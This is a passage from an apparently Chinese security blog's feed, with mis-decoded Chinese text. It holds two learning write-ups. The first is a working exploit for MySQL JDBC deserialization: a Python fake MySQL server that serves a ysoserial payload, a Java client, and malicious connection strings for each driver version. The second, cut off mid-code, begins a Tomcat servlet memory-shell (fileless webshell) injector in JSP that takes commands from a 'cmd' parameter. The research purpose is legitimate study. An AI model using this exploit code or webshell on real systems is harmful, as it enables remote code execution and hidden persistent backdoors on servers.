class="hljs-keyword">return</span> payload_content<br><br><span class="hljs-comment"># ä¸»è¦é€»è¾‘</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        conn, addr = sk.accept()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connection come from &#123;&#125;:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(addr[<span class="hljs-number">0</span>],addr[<span class="hljs-number">1</span>]))<br><br>        <span class="hljs-comment"># 1.å…ˆå‘é€ç¬¬ä¸€ä¸ª é—®å€™æŠ¥æ–‡</span><br>        send_data(conn,greeting_data)<br><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            <span class="hljs-comment"># ç™»å½•è®¤è¯è¿‡ç¨‹æ¨¡æ‹Ÿ  1.å®¢æˆ·ç«¯å‘é€request loginæŠ¥æ–‡ 2.æœåŠ¡ç«¯å“åº”response_ok</span><br>            receive_data(conn)<br>            send_data(conn,response_ok_data)<br><br>            <span class="hljs-comment">#å…¶ä»–è¿‡ç¨‹</span><br>            data=receive_data(conn)<br>            <span class="hljs-comment">#æŸ¥è¯¢ä¸€äº›é…ç½®ä¿¡æ¯,å…¶ä¸­ä¼šå‘é€è‡ªå·±çš„ ç‰ˆæœ¬å·</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;session.auto_increment_increment&quot;</span> <span class="hljs-keyword">in</span> data:<br>                _payload=<span class="hljs-string">&#x27;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000&#x27;</span><br>                send_data(conn,_payload)<br>                data=receive_data(conn)<br>            <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;show warnings&quot;</span> <span class="hljs-keyword">in</span> data:<br>                _payload = <span class="hljs-string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#x27;</span><br>                send_data(conn, _payload)<br>                data = receive_data(conn)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;set names&quot;</span> <span class="hljs-keyword">in</span> data:<br>                send_data(conn, response_ok_data)<br>                data = receive_data(conn)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;set character_set_results&quot;</span> <span class="hljs-keyword">in</span> data:<br>                send_data(conn, response_ok_data)<br>                data = receive_data(conn)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;show session status&quot;</span> <span class="hljs-keyword">in</span> data:<br>                mysql_data = <span class="hljs-string">&#x27;0100000102&#x27;</span><br>                mysql_data += <span class="hljs-string">&#x27;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span><br>                mysql_data += <span class="hljs-string">&#x27;1a000003036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span><br>                <span class="hljs-comment"># ä¸ºä»€ä¹ˆæˆ‘åŠ äº†EOF Packet å°±æ— æ³•æ­£å¸¸è¿è¡Œå‘¢ï¼Ÿï¼Ÿ</span><br>                <span class="hljs-comment">#è·å–payload</span><br>                payload_content=get_payload_content()<br>                <span class="hljs-comment">#è®¡ç®—payloadé•¿åº¦</span><br>                payload_length = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload_content)//<span class="hljs-number">2</span>)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).zfill(<span class="hljs-number">4</span>)<br>                payload_length_hex = payload_length[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>] + payload_length[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]<br>                <span class="hljs-comment">#è®¡ç®—æ•°æ®åŒ…é•¿åº¦</span><br>                data_len = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload_content)//<span class="hljs-number">2</span> + <span class="hljs-number">4</span>)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).zfill(<span class="hljs-number">6</span>)<br>                data_len_hex = data_len[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>] + data_len[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>] + data_len[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]<br>                mysql_data += data_len_hex + <span class="hljs-string">&#x27;04&#x27;</span> + <span class="hljs-string">&#x27;fbfc&#x27;</span>+ payload_length_hex<br>                mysql_data += <span class="hljs-built_in">str</span>(payload_content)<br>                mysql_data += <span class="hljs-string">&#x27;07000005fe000022000100&#x27;</span><br>                send_data(conn, mysql_data)<br>                data = receive_data(conn)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;show warnings&quot;</span> <span class="hljs-keyword">in</span> data:<br>                payload = <span class="hljs-string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#x27;</span><br>                send_data(conn, payload)<br>            <span class="hljs-keyword">break</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    HOST =<span class="hljs-string">&#x27;0.0.0.0&#x27;</span><br>    PORT = <span class="hljs-number">3309</span><br><br>    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    <span class="hljs-comment">#å½“socketå…³é—­åï¼Œæœ¬åœ°ç«¯ç”¨äºè¯¥socketçš„ç«¯å£å·ç«‹åˆ»å°±å¯ä»¥è¢«é‡ç”¨.ä¸ºäº†å®éªŒçš„æ—¶å€™ä¸ç”¨ç­‰å¾…å¾ˆé•¿æ—¶é—´</span><br>    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)<br>    sk.bind((HOST, PORT))<br>    sk.listen(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;start fake mysql server listening on &#123;&#125;:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(HOST,PORT))<br><br>    run()<br></code></pre></td></tr></table></figure><p>Client</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ServerStatusDiffInterceptor;<br><br><span class="hljs-keyword">import</span> java.sql.Connection;<br><span class="hljs-keyword">import</span> java.sql.DriverManager;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">driver</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">DB_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:mysql://127.0.0.1:3309/mysql?characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true&quot;</span>;<span class="hljs-comment">//8.xä½¿ç”¨</span><br>        Class.forName(driver);<br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> DriverManager.getConnection(DB_URL);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åç”Ÿæˆä¸€ä¸ªcc7çš„payloadæ–‡ä»¶æ”¾åœ¨pocçš„ç›®å½•ä¸‹</p><blockquote><p>å§æ§½è¿™æœ‰ä¸ªå¥‡æ€ªçš„å‘ï¼Œysoserialç”Ÿæˆpayloadçš„æ—¶å€™å‘½ä»¤ä¸èƒ½ç”¨å¼•å·æ‹¬èµ·æ¥ï¼Œä¸ç„¶å°±æŠ¥é”™äº†ï¼Œåæ­£æˆ‘æ˜¯è¿™æ ·çš„ï¼ˆåº”è¯¥æ˜¯ä¸èƒ½å•å¼•å·ï¼ŒåŒå¼•å·æ˜¯å¯ä»¥çš„</p></blockquote><p>æ‰§è¡Œæ•ˆæœ</p><p><img src="https://cdn.clown2024.cn/202410012339938.png" alt="image-20241001233903839"></p><p><img src="https://cdn.clown2024.cn/202410012339163.png" alt="image-20241001233926085"></p><p>ç„¶å8.0.20ä¹‹åä¸å†è°ƒç”¨resultSetToMapæ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯ä¸å†è°ƒç”¨getObjectæ–¹æ³•äº†ï¼Œæ‰€ä»¥è¿™æ¡é“¾ä¹Ÿå°±æ‰“ä¸é€šäº†</p><h2 id="å…¶ä»–ç‰ˆæœ¬"><a href="#å…¶ä»–ç‰ˆæœ¬" class="headerlink" title="å…¶ä»–ç‰ˆæœ¬"></a>å…¶ä»–ç‰ˆæœ¬</h2><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.anquanke.com/post/id/203086">https://www.anquanke.com/post/id/203086</a></p><p>å…ˆè¯´ä¸€ä¸‹ç”±äºç‰ˆæœ¬ä¸åŒå¸¦æ¥çš„æ”¹å˜</p><ol><li>ä»6.0å¼€å§‹ä¸»è¦ä½¿ç”¨çš„åŒ…åä»Â·<code>com.mysql</code>å˜ä¸ºäº†<code>com.mysql.cj</code>,æ‰€ä»¥<code>ServerStatusDiffInterceptor</code>æ‰€åœ¨ä½ç½®ä¹Ÿæœ‰æ‰€æ”¹å˜ã€‚</li><li>5.1.11-6.0.6ä½¿ç”¨çš„interceptorså±æ€§ä¸ºstatementInterceptorsï¼Œ8.0ä»¥ä¸Šä½¿ç”¨çš„ä¸ºqueryInterceptorsã€‚</li><li>5.1.11ä»¥ä¸‹ï¼Œæ— æ³•ç›´æ¥é€šè¿‡è¿æ¥è§¦å‘ï¼šåœ¨æ‰§è¡ŒgetConnectionæ—¶ï¼Œä¼šæ‰§è¡Œåˆ°com.mysql.jdbc.ConnectionImplä¸­</li></ol><p>å„ç‰ˆæœ¬æœ€åéƒ½æ˜¯éœ€è¦åˆ°getObjectæ–¹æ³•é‡Œé¢å»è¿›è¡Œååºåˆ—åŒ–</p><h3 id="510-5110"><a href="#5-1-0-5-1-10" class="headerlink" title="5.1.0-5.1.10"></a>5.1.0-5.1.10</h3><p>è¿æ¥ä¸²å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor<br></code></pre></td></tr></table></figure><p>è¿æ¥ä¹‹åéœ€è¦æ‰§è¡ŒæŸ¥è¯¢</p><h3 id="5111-5xxx"><a href="#5-1-11-5-x-xx" class="headerlink" title="5.1.11-5.x.xx"></a>5.1.11-5.x.xx</h3><p>è¿æ¥ä¸²å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor<br></code></pre></td></tr></table></figure><h3 id="6x"><a href="#6-x" class="headerlink" title="6.x"></a>6.x</h3><p>è¿æ¥ä¸²å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor<br></code></pre></td></tr></table></figure><h1 id="detectcustomcollationsé“¾"><a href="#detectCustomCollationsé“¾" class="headerlink" title="detectCustomCollationsé“¾"></a>detectCustomCollationsé“¾</h1><h2 id="å„ç‰ˆæœ¬è¿æ¥ä¸²"><a href="#å„ç‰ˆæœ¬è¿æ¥ä¸²" class="headerlink" title="å„ç‰ˆæœ¬è¿æ¥ä¸²"></a>å„ç‰ˆæœ¬è¿æ¥ä¸²</h2><p>å…ˆç»™å‡ºå„ç‰ˆæœ¬çš„è¿æ¥ä¸²</p><ul><li>5.1.19-5.1.28ï¼šjdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc</li><li>5.1.29-5.1.48ï¼šjdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?detectCustomCollations&#x3D;true&amp;autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc</li><li>5.1.49ï¼šä¸å¯ç”¨</li><li>6.0.2-6.0.6ï¼šjdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?detectCustomCollations&#x3D;true&amp;autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc</li><li>8.x.x ï¼šä¸å¯ç”¨</li></ul><p>è¯¥é“¾å­ååºåˆ—åŒ–çš„ç‚¹ä¹Ÿæ˜¯åœ¨resultSetToMap()æ–¹æ³•é‡Œé¢</p><p>payloadçš„ä¸åŒä¸»è¦åœ¨äºæœ‰äº›ç‰ˆæœ¬ä¼šå¯¹detectCustomCollationså‚æ•°è¿›è¡Œæ ¡éªŒä¹‹åæ‰ä¼šåˆ°ååºåˆ—åŒ–ç‚¹é‡Œé¢å»ã€‚</p><h2 id="åŸç†åˆ†æ"><a href="#åŸç†åˆ†æ-1" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h2><h3 id="5119-5140"><a href="#5-1-19-5-1-40" class="headerlink" title="5.1.19-5.1.40"></a>5.1.19-5.1.40</h3><p>è¿™é‡Œçš„åˆ©ç”¨åˆ©ç”¨é“¾æ¯”è¾ƒç®€å•ï¼Œåœ¨getConnectionçš„æ—¶å€™ä¼šè°ƒç”¨åˆ°**com.mysql.jdbc.ConnectionImpl#buildCollationMapping()**æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410030920363.png" alt="image-20241003092042235"></p><p>è¿™é‡Œæ‰§è¡Œäº†SHOW COLLATIONæŸ¥è¯¢è¯­å¥ï¼Œç„¶åè°ƒç”¨äº†resultSetToMap</p><h3 id="5141-5148"><a href="#5-1-41-5-1-48" class="headerlink" title="5.1.41-5.1.48"></a>5.1.41-5.1.48</h3><p>è¯¥ç‰ˆæœ¬çš„buildCollationMapping()æ–¹æ³•ä¸å†è°ƒç”¨resultSetToMapæ–¹æ³•ï¼Œä½†æ˜¯ç›´æ¥è°ƒç”¨äº†getObjectæ–¹æ³•ï¼Œæ‰€ä»¥payloadä¹Ÿæ²¡å˜åŒ–</p><p><img src="https://cdn.clown2024.cn/202410030924201.png" alt="image-20241003092445101"></p><h3 id="5149"><a href="#5-1-49" class="headerlink" title="5.1.49"></a>5.1.49</h3><p>è¯¥ç‰ˆæœ¬å°±ä¸å†è°ƒç”¨getObjectæ–¹æ³•ï¼Œæ‰€ä»¥é“¾å­ä¹Ÿå°±ä¸å¯ç”¨äº†</p><h3 id="602-606"><a href="#6-0-2-6-0-6" class="headerlink" title="6.0.2-6.0.6"></a>6.0.2-6.0.6</h3><p>è¯¥ç‰ˆæœ¬resultSetToMapåˆå›æ¥äº†</p><p><img src="https://cdn.clown2024.cn/202410030933152.png" alt="image-20241003093358073"></p><h3 id="8xx"><a href="#8-x-x" class="headerlink" title="8.x.x"></a>8.x.x</h3><p>8.0ä»¥ä¸Šä¸å†åœ¨com.mysql.cj.jdbc.ConnectionImplä¸­ç›´æ¥æ‰§è¡ŒåŠè·å–â€SHOW COLLATIONâ€è¯­å¥ï¼Œè°ƒç”¨é“¾æ›´æ”¹ï¼Œä¸å†è°ƒç”¨getObject()æ–¹æ³•ï¼Œæ­¤é“¾å¤±æ•ˆ</p><h1 id="mysqlæ¶æ„æœåŠ¡å™¨"><a href="#mysqlæ¶æ„æœåŠ¡å™¨" class="headerlink" title="mysqlæ¶æ„æœåŠ¡å™¨"></a>mysqlæ¶æ„æœåŠ¡å™¨</h1><p>èµ·æ¶æ„çš„mysqlæœåŠ¡è¿˜å¯ä»¥ç”¨fnmsdå¸ˆå‚…çš„<a href="https://github.com/fnmsd/MySQL_Fake_Server">MySQL_Fake_Serveré¡¹ç›®</a>ï¼ˆè¿™ä¸ªæˆ‘æ²¡è·‘èµ·æ¥ï¼‰</p><p>è¿˜æ¨èä¸€ä¸ªjavaå†™çš„å¸¦guiçš„é¡¹ç›®ï¼š<a href="https://github.com/4ra1n/mysql-fake-server">https://github.com/4ra1n/mysql-fake-server</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;æ¥å­¦ä¸€ä¸‹å¸¸è§çš„JDBCååºåˆ—åŒ–ï¼Œæ˜¯MYSQLçš„ï¼Œå‚è€ƒæ–‡ç« ï¼š&lt;a href=&quot;https://tttang.com/archive/1877/&quot;&gt;https://tttang.com/archive/1877/&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;jdbcç®€å•ä»‹ç»&quot;&gt;&lt;a hre</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="ååºåˆ—åŒ–" scheme="https://clowsman.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>ä¼ ç»Ÿwebåº”ç”¨å‹å†…å­˜é©¬</title>
    <link href="https://clowsman.github.io/2024/09/14/%E4%BC%A0%E7%BB%9Fweb%E5%BA%94%E7%94%A8%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <id>https://clowsman.github.io/2024/09/14/%E4%BC%A0%E7%BB%9Fweb%E5%BA%94%E7%94%A8%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/</id>
    <published>2024-09-14T14:31:10.000Z</published>
    <updated>2024-09-20T15:19:53.070Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™é‡Œæ˜¯æœ¬èœé¸¡å¼€å§‹å­¦ä¹ å†…å­˜é©¬çš„èµ·å§‹æ–‡ç« </p><p>æœ‰å…³å†…å­˜é©¬çš„è®¤çŸ¥å¯ä»¥çœ‹çœ‹su18å¸ˆå‚…çš„è¿™ç¯‡æ–‡ç« ï¼š<a href="https://mp.weixin.qq.com/s/NKq4BZ8fLK7bsGSK5UhoGQ">https://mp.weixin.qq.com/s/NKq4BZ8fLK7bsGSK5UhoGQ</a></p><p>æœ‰å…³tomcatæºç åˆ†æçš„æ–‡ç« ï¼š<a href="https://blog.csdn.net/u010883443/article/details/107463782">Tomcatæºç åˆè¯†ä¸€ Tomcatæ•´ç†æµç¨‹å›¾_tomcatæµç¨‹å›¾-CSDNåšå®¢</a></p><p>ç„¶åè¿™é‡Œæœ‰ä¸€ç¯‡æ€»ç»“å¾—ç‰¹åˆ«å…¨å¾—å†…å­˜é©¬æ–‡ç« ï¼š<a href="https://paper.seebug.org/3120/">https://paper.seebug.org/3120/</a></p><p>è¿™é‡Œæ”¾ä¸€å¼ æ–‡ç« ä¸­çš„æºç åˆ†æçš„åˆå§‹åŒ–æµç¨‹å›¾ï¼š</p><p><img src="https://cdn.clown2024.cn/202409161536558.png" alt="å†…å­˜é©¬æµç¨‹"></p><p>åšä¸ªå‚è€ƒå¯¹å¤§è‡´æµç¨‹æœ‰ä¸ªæ¦‚å¿µ</p><blockquote><p> è°ƒè¯•çš„æ—¶å€™æˆ‘çªç„¶å‘ç°ä¸åº”è¯¥å¼€å¯tomcatçš„è‡ªåŠ¨æ‰“å¼€æµè§ˆå™¨ï¼Œè¿™æ ·è°ƒè¯•è®¿é—®å‰æˆ–è€…è®¿é—®åçš„é€»è¾‘æ˜¯æ‰ä¸ä¼šé‚£ä¹ˆä¹±ğŸ˜¢</p><p> å› ä¸ºä»–é»˜è®¤æ˜¯åœ¨æˆ‘ä»¬è®¿é—®åæ‰ä¼šå»åˆ›å»ºå®ä¾‹</p></blockquote><h1 id="servletå†…å­˜é©¬"><a href="#Servletå†…å­˜é©¬" class="headerlink" title="Servletå†…å­˜é©¬"></a>Servletå†…å­˜é©¬</h1><h2 id="ç®€å•demo"><a href="#ç®€å•demo" class="headerlink" title="ç®€å•demo"></a>ç®€å•demo</h2><p>å…ˆå†™ä¸€ä¸ªç®€å•çš„demoç„¶åå†åˆ†æä¸€ä¸‹åŸç†å§ï¼Œå…ˆçœ‹çœ‹æ•ˆæœ</p><blockquote><p>è¿™é‡Œç”¨äº†ä½¿ç”¨äº†tomcat8ï¼Œtomcat10ç”¨é‚£ä¸ªdemoæœ‰äº›ç±»æ‰¾ä¸åˆ°</p><p>è¦çœ‹æºç çš„è¯éœ€è¦å¯¼å…¥å¯¹åº”tomcatç‰ˆæœ¬çš„ä¾èµ–</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.50<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™æ˜¯tomcatçš„æ ¸å¿ƒä¾èµ–ï¼Œèµ·æœåŠ¡çš„è¿‡ç¨‹æºç åŸºæœ¬éƒ½åœ¨è¿™é‡Œ</p></blockquote><p>ç¼–å†™ä¸€ä¸ªservletå†…å­˜é©¬çš„æ­¥éª¤ï¼š</p><ul><li>æ‰¾åˆ°StandardContext</li><li>ç»§æ‰¿å¹¶ç¼–å†™ä¸€ä¸ªæ¶æ„servlet</li><li>åˆ›å»ºWapperå¯¹è±¡</li><li>è®¾ç½®Servletçš„LoadOnStartUpçš„å€¼</li><li>è®¾ç½®Servletçš„Name</li><li>è®¾ç½®Servletå¯¹åº”çš„Class</li><li>å°†Servletæ·»åŠ åˆ°contextçš„childrenä¸­</li><li>å°†urlè·¯å¾„å’Œservletç±»åšæ˜ å°„</li></ul><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.Servlet&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.ServletConfig&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.ServletContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.ServletRequest&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.ServletResponse&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Scanner&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.PrintWriter&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;MemoryShellInjectDemo&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getSession().getServletContext();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">appctx</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>        appctx.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appctx.get(servletContext);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">stdctx</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>        stdctx.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) stdctx.get(applicationContext);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">servletURL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/&quot;</span> + getRandomString();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">servletName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Servlet&quot;</span> + getRandomString();<br>        <span class="hljs-type">Servlet</span> <span class="hljs-variable">servlet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Servlet</span>() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig servletConfig)</span> &#123;&#125;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title function_">getServletConfig</span><span class="hljs-params">()</span> &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> servletRequest.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>                &#123;<br>                    <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> 